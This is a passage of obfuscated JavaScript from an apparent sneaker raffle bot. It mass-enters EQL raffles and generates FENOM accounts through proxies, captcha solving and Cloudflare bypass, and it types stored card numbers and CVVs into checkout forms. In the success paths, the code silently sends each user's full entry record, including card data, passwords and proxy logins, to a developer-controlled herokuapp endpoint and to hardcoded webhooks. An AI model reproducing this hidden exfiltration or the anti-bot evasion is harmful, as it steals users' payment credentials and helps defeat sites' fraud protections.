                            await _0x41ff52(0x3e8), await _0x41ff52(0x1f4), await _0x1c0eeb['type']('#address1', _0x32ab8f[_0x4d0327]['Address1'] + '\x20' + _0x32ab8f[_0x4d0327]['HouseNumber']), await _0x41ff52(0x1f4), await _0x1c0eeb['type']('#address2', '' + _0x32ab8f[_0x4d0327]['Address2']), await _0x41ff52(0x1f4), await _0x1c0eeb['type']('#city', '' + _0x32ab8f[_0x4d0327]['City']), await _0x41ff52(0x1f4), await _0x1c0eeb['type']('#postcode', '' + _0x32ab8f[_0x4d0327]['Zip']), await _0x41ff52(0x3e8), await _0x1c0eeb['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x41ff52(0x3e8), console['log'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            try {
                                await _0x1c0eeb['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]');
                            } catch {
                                throw new Error('No\x20Payment\x20Token\x20Found');
                            }
                            await _0x41ff52(0x7d0), await _0x1c0eeb['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x41ff52(0x12c), await _0x1c0eeb['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x41ff52(0x4b0), await _0x1c0eeb['keyboard']['type']('' + _0x32ab8f[_0x4d0327]['CardNumber']), await _0x41ff52(0x320), await _0x1c0eeb['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x1c0eeb['keyboard']['type']('' + _0x32ab8f[_0x4d0327]['ExpiryDate']), await _0x41ff52(0x4b0), await _0x1c0eeb['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x1c0eeb['keyboard']['type']('' + _0x32ab8f[_0x4d0327]['CVV']), await _0x41ff52(0x226), await _0x1c0eeb['type']('input[name=\x22postalCode\x22]', '' + _0x32ab8f[_0x4d0327]['Zip']), await _0x41ff52(0x226), await _0x1c0eeb['click']('#paymentConsent'), await _0x41ff52(0x226), await _0x1c0eeb['click']('#termsConsent'), await _0x41ff52(0x2bc), console['log'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x1c0eeb['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x41ff52(0x2710);
                            try {
                                await _0x1c0eeb['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x41ff52(0xbb8), await _0x1c0eeb['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x366eed => _0x366eed['click']()), await _0x1c0eeb['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x5265be => _0x5265be['click']());
                            } catch {
                            }
                            try {
                                await _0x1c0eeb['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x10987e = await _0x1c0eeb['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x10987e) {
                                    _0x144018['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x32ab8f[_0x4d0327]['Email'] + ',' + _0x32ab8f[_0x4d0327]['Password'] + ',' + _0x32ab8f[_0x4d0327]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x5d0f2c() {
                                var _0x1624d4, _0x1c30c2 = ![];
                                for (var _0x5f5aef = 0x0; _0x5f5aef < 0x18; _0x5f5aef++) {
                                    async function _0x5978dd() {
                                        var _0x47a19e = new _0x2b7859({
                                            'user': _0x4a0109['masterMail'],
                                            'password': _0x4a0109['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x591c78(_0x540197) {
                                            _0x47a19e['openBox']('INBOX', ![], _0x540197);
                                        }
                                        _0x47a19e['once']('ready', function () {
                                            console['log'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x591c78(function (_0x442dc1, _0x5ec9f0) {
                                                console['log'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x442dc1)
                                                    throw _0x442dc1;
                                                _0x47a19e['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x22c922, _0x915a66) {
                                                    if (!_0x915a66 || !_0x915a66['length'])
                                                        console['log'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x47a19e['end']();
                                                    else {
                                                        var _0x430437 = _0x47a19e['seq']['fetch'](_0x915a66, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x430437['on']('message', function (_0x59a96a, _0x1b642c) {
                                                            var _0xb6753f = '(#' + _0x1b642c + ')\x20';
                                                            _0x59a96a['on']('body', function (_0x2285eb, _0x456ce4) {
                                                                _0x186dbf(_0x2285eb, (_0x38f41d, _0x18a739) => {
                                                                    if (_0x18a739['subject']['includes']('code')) {
                                                                        const _0x550e0b = _0x18a739['text']['split']('\x0a\x0a')[0x3], _0x579421 = _0x550e0b['split']('\x0a')[0x1];
                                                                        _0x1624d4 = _0x579421;
                                                                    }
                                                                });
                                                            }), _0x59a96a['once']('end', function () {
                                                            });
                                                        }), _0x430437['once']('error', function (_0x1139eb) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x430437['once']('end', function () {
                                                            _0x47a19e['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x47a19e['once']('error', function (_0x43d711) {
                                            console['log'](_0xe8dd24['red'](_0x43d711['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x1c30c2 = !![];
                                        }), _0x47a19e['once']('end', async function () {
                                        }), _0x47a19e['connect']();
                                    }
                                    _0x5978dd(), await _0x41ff52(0x1388);
                                    if (_0x1624d4)
                                        return _0x1624d4;
                                    if (_0x1c30c2)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x5f5aef == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x5d0f2c(), await _0x41ff52(0x1f4), await _0x1c0eeb['type']('#code', '' + code), await _0x41ff52(0x3e8), await _0x1c0eeb['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x32f3b8 => _0x32f3b8['click']()), await _0x1c0eeb['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x1c0eeb['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x32ab8f[_0x4d0327]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x144018['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x32ab8f[_0x4d0327]['Email'] + ',' + _0x32ab8f[_0x4d0327]['Password'] + ',' + _0x32ab8f[_0x4d0327]['Phone']), _0x2223c4 = 'no', _0xe72aef(_0x32ab8f[_0x4d0327], _0x11cd13);
                            var _0x2ed718 = await _0x17c0a2(_0x32ab8f[_0x4d0327], _0x11cd13, 'dev', ![]), _0x385d67 = await _0x17c0a2(_0x32ab8f[_0x4d0327], _0x11cd13, 'pub', ![]);
                            let _0x14b5f0 = _0x32ab8f[_0x4d0327];
                            try {
                                prxdata = {
                                    'username': _0x4f2583['replace']('#', ''),
                                    'module': _0x11cd13['name'],
                                    'entrydata': JSON['stringify'](_0x14b5f0),
                                    'proxy': '' + _0x15174e[_0x4d0327]
                                };
                                var _0x1ce0b3 = JSON['stringify'](prxdata);
                                let _0x5ebc4a = { 'headers': { 'content-type': 'application/json' } };
                                await _0x469c71['post']('https://jraffles.herokuapp.com/success', _0x1ce0b3, _0x5ebc4a);
                            } catch (_0xbef748) {
                            }
                            const _0x543f88 = {
                                'succesDEVMSG': { 'embeds': [_0x2ed718] },
                                'succesPUBMSG': { 'embeds': [_0x385d67] }
                            };
                            try {
                                _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x543f88['succesDEVMSG']), await _0x41ff52(0xc8), await _0x161ab9(_0x6ed44c, _0x543f88['succesDEVMSG']), await _0x41ff52(0xc8), await _0x161ab9(_0x17a127, _0x543f88['succesPUBMSG']);
                            } catch (_0x1091b1) {
                                console['log'](_0xe8dd24['yellow'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1091b1));
                            }
                        } catch (_0x591388) {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20' + _0x591388)), _0x64c432 = '' + _0x591388;
                            var _0x228de3 = await _0x17c0a2(_0x32ab8f[_0x4d0327], _0x11cd13, 'dev', !![], _0x64c432), _0x2ed718 = await _0x17c0a2(_0x32ab8f[_0x4d0327], _0x11cd13, 'dev', ![]), _0x385d67 = await _0x17c0a2(_0x32ab8f[_0x4d0327], _0x11cd13, 'pub', ![]);
                            const _0xad6b3c = {
                                'succesDEVMSG': { 'embeds': [_0x2ed718] },
                                'succesPUBMSG': { 'embeds': [_0x385d67] }
                            };
                            _0xad6b3c['errorDEV'] = { 'embeds': [_0x228de3] };
                            _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0xad6b3c['errorDEV']);
                            await _0x161ab9(_0x11ee4c, _0xad6b3c['errorDEV']);
                            if (!_0x2223c4 == 'no')
                                _0x2223c4 = 'yes';
                        } finally {
                            _0x2c0490 && _0x2c0490['close']();
                            if (_0x2223c4 == 'yes' && _0x26bdd8 != 0x5) {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Retrying\x20(' + _0x26bdd8 + '\x20/\x205)')), _0x4d0327 = _0x4d0327 - 0x1, _0x26bdd8 = _0x26bdd8 + 0x1;
                                continue;
                            }
                            _0x2223c4 == 'yes' && _0x26bdd8 >= 0x5 && (_0x53e25e(_0x32ab8f[_0x4d0327], _0x11cd13), _0x2223c4 = 'no', _0x26bdd8 = 0x0), console['log']('Waiting\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                        }
                    } else {
                        const _0x4ccd09 = '' + _0x32ab8f[_0x4d0327]['Url'];
                        if (_0x2223c4 != 'yes')
                            var _0x2223c4 = '', _0x26bdd8 = 0x0;
                        if (_0x32ab8f[_0x4d0327]['Email'] == '' || _0x32ab8f[_0x4d0327]['FirstName'] == '' || _0x32ab8f[_0x4d0327]['LastName'] == '') {
                            console['log'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x32ab8f[_0x4d0327]['Password'] == '' && (_0x32ab8f[_0x4d0327]['Password'] = 'JRaffles23!');
                        if (_0x4a0109['useRandomProxy'] = ![])
                            var _0x29e6a7 = _0x15174e[_0x4d0327]['split'](':');
                        else
                            var _0x25d4e6 = Math['round'](Math['random']() * (_0x15174e['length'] - 0x1)), _0x29e6a7 = _0x15174e[_0x25d4e6]['split'](':');
                        var _0x2c0490;
                        try {
                            _0x2c0490 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x29e6a7[0x0] + ':' + _0x29e6a7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2c0490 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x29e6a7[0x0] + ':' + _0x29e6a7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5c9582 = await _0x2c0490['newPage']();
                            await _0x5c9582['authenticate']({
                                'username': '' + _0x29e6a7[0x2],
                                'password': '' + _0x29e6a7[0x3]
                            }), console['log'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5c9582['setRequestInterception'](!![]), _0x5c9582['on']('request', _0x5ddbcc => {
                                _0x5ddbcc['resourceType']() === 'image' || _0x5ddbcc['resourceType']() === 'font' || _0x5ddbcc['resourceType']() === 'media' ? _0x5ddbcc['abort']() : _0x5ddbcc['continue']();
                            }), await _0x5c9582['goto'](_0x4ccd09), await _0x5c9582['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x5c9582['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x41ff52(0x7d0), await _0x5c9582['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x5c9582['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x41ff52(0x3e8), await _0x5c9582['waitForSelector']('#email'), console['log'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x5c9582['type']('#email', '' + _0x32ab8f[_0x4d0327]['Email']), await _0x41ff52(0x352), await _0x5c9582['waitForSelector']('#password'), await _0x5c9582['type']('#password', '' + _0x32ab8f[_0x4d0327]['Password']), await _0x41ff52(0x352), await _0x5c9582['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x41ff52(0x3e8);
                            try {
                                await _0x5c9582['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0xe72aef(_0x32ab8f[_0x4d0327], _0x11cd13), _0x2223c4 = 'no';
                                continue;
                            }
                            await _0x5c9582['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x41ff52(0x3e8), await _0x5c9582['click']('li[data-value=\x22EU\x20' + _0x32ab8f[_0x4d0327]['Size'] + '\x22]'), await _0x41ff52(0x1f4), await _0x5c9582['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x5c9582['focus']('#postcode'), await _0x5c9582['keyboard']['down']('Control'), await _0x5c9582['keyboard']['press']('A'), await _0x5c9582['keyboard']['up']('Control'), await _0x5c9582['keyboard']['press']('Backspace'), await _0x5c9582['keyboard']['type'](_0x32ab8f[_0x4d0327]['Zip']), await _0x41ff52(0x60e), await _0x5c9582['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x41ff52(0x3e8), console['log'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x5c9582['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5c9582['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5c9582['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x41ff52(0x4b0), await _0x5c9582['keyboard']['type']('' + _0x32ab8f[_0x4d0327]['CardNumber']), await _0x41ff52(0x320), await _0x5c9582['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5c9582['keyboard']['type']('' + _0x32ab8f[_0x4d0327]['ExpiryDate']), await _0x41ff52(0x4b0), await _0x5c9582['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5c9582['keyboard']['type']('' + _0x32ab8f[_0x4d0327]['CVV']), await _0x41ff52(0x226), await _0x5c9582['type']('input[name=\x22postalCode\x22]', '' + _0x32ab8f[_0x4d0327]['Zip']), await _0x41ff52(0x226), await _0x5c9582['click']('#paymentConsent'), await _0x41ff52(0x226), await _0x5c9582['click']('#termsConsent'), await _0x41ff52(0x2bc), console['log'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x5c9582['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x41ff52(0x2710);
                            try {
                                await _0x5c9582['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x41ff52(0xbb8), await _0x5c9582['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x5dfafd => _0x5dfafd['click']()), await _0x5c9582['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x5b87e7 => _0x5b87e7['click']());
                            } catch {
                            }
                            try {
                                await _0x5c9582['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0xe72aef(_0x32ab8f[_0x4d0327], _0x11cd13);
                            var _0x2ed718 = await _0x17c0a2(_0x32ab8f[_0x4d0327], _0x11cd13, 'dev', ![]), _0x385d67 = await _0x17c0a2(_0x32ab8f[_0x4d0327], _0x11cd13, 'pub', ![]);
                            let _0x1700c3 = _0x32ab8f[_0x4d0327];
                            try {
                                prxdata = {
                                    'username': _0x4f2583['replace']('#', ''),
                                    'module': _0x11cd13['name'],
                                    'entrydata': JSON['stringify'](_0x1700c3),
                                    'proxy': '' + _0x15174e[_0x4d0327]
                                };
                                var _0x1ce0b3 = JSON['stringify'](prxdata);
                                let _0x5c294b = { 'headers': { 'content-type': 'application/json' } };
                                await _0x469c71['post']('https://jraffles.herokuapp.com/success', _0x1ce0b3, _0x5c294b);
                            } catch (_0x423a31) {
                            }
                            const _0x2b850f = {
                                'succesDEVMSG': { 'embeds': [_0x2ed718] },
                                'succesPUBMSG': { 'embeds': [_0x385d67] }
                            };
                            try {
                                _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x2b850f['succesDEVMSG']), await _0x41ff52(0xc8), await _0x161ab9(_0x6ed44c, _0x2b850f['succesDEVMSG']), await _0x41ff52(0xc8), await _0x161ab9(_0x17a127, _0x2b850f['succesPUBMSG']);
                            } catch (_0x118775) {
                                console['log'](_0xe8dd24['yellow'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x118775));
                            }
                            _0x2223c4 = 'no';
                        } catch (_0xb5ed95) {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20' + _0xb5ed95)), _0x64c432 = '' + _0xb5ed95;
                            var _0x228de3 = await _0x17c0a2(_0x32ab8f[_0x4d0327], _0x11cd13, 'dev', !![], _0x64c432), _0x2ed718 = await _0x17c0a2(_0x32ab8f[_0x4d0327], _0x11cd13, 'dev', ![]), _0x385d67 = await _0x17c0a2(_0x32ab8f[_0x4d0327], _0x11cd13, 'pub', ![]);
                            const _0x541f25 = {
                                'succesDEVMSG': { 'embeds': [_0x2ed718] },
                                'succesPUBMSG': { 'embeds': [_0x385d67] }
                            };
                            _0x541f25['errorDEV'] = { 'embeds': [_0x228de3] }, _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x541f25['errorDEV']), await _0x161ab9(_0x11ee4c, _0x541f25['errorDEV']), _0x2223c4 = 'yes';
                        } finally {
                            _0x2c0490 && _0x2c0490['close']();
                            if (_0x2223c4 == 'yes' && _0x26bdd8 != 0x5) {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x11cd13['name'] + ']\x20Task\x20' + (_0x4d0327 + 0x1) + '\x20:\x20Retrying\x20(' + _0x26bdd8 + '\x20/\x205)')), _0x4d0327 = _0x4d0327 - 0x1, _0x26bdd8 = _0x26bdd8 + 0x1;
                                continue;
                            }
                            _0x2223c4 == 'yes' && _0x26bdd8 >= 0x5 && (_0x53e25e(_0x32ab8f[_0x4d0327], _0x11cd13), _0x2223c4 = 'no', _0x26bdd8 = 0x0), console['log']('Waiting\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x36b0f8, _0x3011c6, _0x519d04) {
                    _0x3ad8ba['use'](_0x36d6c8()), _0x3ad8ba['use'](_0x541303({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a0109['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x490a16 = 0x0; _0x490a16 < _0x3011c6['length']; _0x490a16++) {
                        if (_0x4b81d7 != 'yes')
                            var _0x4b81d7 = '', _0x2280d2 = 0x0;
                        var _0x2ccda5;
                        try {
                            await _0x547a29(_0x3011c6, _0x490a16);
                        } catch {
                            _0x4b81d7 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3a603f(_0x36b0f8['name'] + '\x20Task\x20' + (_0x490a16 + 0x1) + '\x20/\x20' + _0x3011c6['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4);
                        var _0x285f8f = await _0x17c0a2(_0x3011c6[_0x490a16], _0x36b0f8, 'acc', ![]);
                        const _0x25fd82 = { 'succesDEVMSG': { 'embeds': [_0x285f8f] } }, _0x1d6cd0 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x1165c6 = Math['round'](Math['random']() * (_0x519d04['length'] - 0x1)), _0x4dbf3c = _0x519d04[_0x1165c6]['split'](':'), _0x55b15b;
                        try {
                            _0x55b15b = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4dbf3c[0x0] + ':' + _0x4dbf3c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x55b15b = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4dbf3c[0x0] + ':' + _0x4dbf3c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3d2bd5 = await _0x55b15b['newPage']();
                            await _0x3d2bd5['setViewport']({
                                'width': 0x500 + _0x2baaff(0x1, 0x32),
                                'height': 0x2d9 + _0x2baaff(0x1, 0x32)
                            });
                            const _0x5a09ac = await _0x3d2bd5['target']()['createCDPSession'](), { windowId: _0x49503d } = await _0x5a09ac['send']('Browser.getWindowForTarget');
                            await _0x3d2bd5['authenticate']({
                                'username': '' + _0x4dbf3c[0x2],
                                'password': '' + _0x4dbf3c[0x3]
                            }), console['log'](_0x2fd7e7() + '\x20[' + _0x36b0f8['name'] + ']\x20Task\x20' + (_0x490a16 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3d2bd5['goto']('' + _0x1d6cd0, { 'waitUntil': 'networkidle2' }), console['log'](_0x2fd7e7() + '\x20[' + _0x36b0f8['name'] + ']\x20Task\x20' + (_0x490a16 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x41ff52(0x1388);
                            var _0xb3aaef = await _0x3d2bd5['$']('.hcaptcha-box');
                            if (_0xb3aaef) {
                                console['log'](_0x2fd7e7() + '\x20[' + _0x36b0f8['name'] + ']\x20Task\x20' + (_0x490a16 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x41ff52(0x2710);
                                const _0x1e2207 = await _0x3d2bd5['$']('.hcaptcha-box');
                                if (_0x1e2207)
                                    try {
                                        await _0x1e2207['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x3d2bd5['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x13ad83 = await _0x3d2bd5['$']('.hcaptcha-box');
                                    if (_0x13ad83)
                                        try {
                                            await _0x13ad83['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x3d2bd5['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x5a09ac['send']('Browser.setWindowBounds', {
                                    'windowId': _0x49503d,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x41ff52(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x2fd7e7() + '\x20[' + _0x36b0f8['name'] + ']\x20Task\x20' + (_0x490a16 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x3d2bd5['type']('input[name=\x22firstname\x22]', '' + _0x3011c6[_0x490a16]['FirstName']), await _0x41ff52(0x1f4), await _0x3d2bd5['type']('input[name=\x22lastname\x22]', '' + _0x3011c6[_0x490a16]['LastName']), await _0x41ff52(0x1f4), await _0x3d2bd5['type']('input[name=\x22email\x22]', '' + _0x3011c6[_0x490a16]['Email']), await _0x41ff52(0x1f4), await _0x3d2bd5['type']('input[name=\x22password\x22]', '' + _0x3011c6[_0x490a16]['Password']), await _0x41ff52(0x258), await _0x3d2bd5['$eval']('input[name=\x22psgdpr\x22]', _0x440351 => _0x440351['click']()), await _0x41ff52(0x1f4), console['log'](_0x2fd7e7() + '\x20[' + _0x36b0f8['name'] + ']\x20Task\x20' + (_0x490a16 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x3d2bd5['$eval']('#customer-form', _0x256521 => _0x256521['submit']());
                            try {
                                try {
                                    await _0x3d2bd5['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
